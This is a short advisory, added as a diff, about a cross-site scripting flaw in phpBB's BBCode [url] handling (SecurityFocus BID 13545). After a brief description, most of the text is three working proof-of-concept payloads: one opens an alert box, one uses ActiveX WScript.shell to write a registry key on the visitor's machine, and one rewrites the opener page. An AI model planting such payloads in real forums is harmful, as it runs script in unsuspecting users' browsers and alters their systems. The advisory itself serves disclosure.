@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/13545/info
+
+The phpbb vendor reports that a critical vulnerability exists in the BBCode handling routines of the 'bbcode.php' script.
+
+The bbcode [url] tag is not properly sanitized of user-supplied input. This could permit the injection of arbitrary HTML or script code into the browser of an unsuspecting user in the context of the affected site. 
+
+[url=javascript://%0ASh=alert(%22CouCou%22);window.close();]Alert box with "CouCou"[/url]
+
+[url=javascript://%0ASh=new%20ActiveXObject(%22WScript.shell%22);Sh.regwrite(%22HKCU%5C%5CQQQQQ%5C%5Cqq%22,%22CouCou%22)
+;window.close();]Create registry entry: HKCU\QQQQQ\qq = "CouCou"[/url]
+
+[url=javascript://%0Awindow.opener.document.body.innerHTML=window.opener.document.body.innerHTML.replace(%27Hi%20Paul%27
+,%27Hi%20P.A.U.L%27);window.close();]Modify opener page: Paul -> P.A.U.L[/url] 
